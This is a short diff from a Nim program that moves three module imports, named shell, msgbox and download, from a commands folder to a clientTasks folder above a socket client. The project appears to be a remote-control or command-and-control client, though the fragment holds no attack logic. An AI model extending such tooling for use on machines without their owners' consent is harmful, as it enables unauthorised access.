@@ -2,7 +2,7 @@ import net, base64, json, os
 
 import modules, communication
 
-import ../commands/[shell, msgbox, download]
+import ../clientTasks/[shell, msgbox, download]
 
 var client: Socket = newSocket()
 
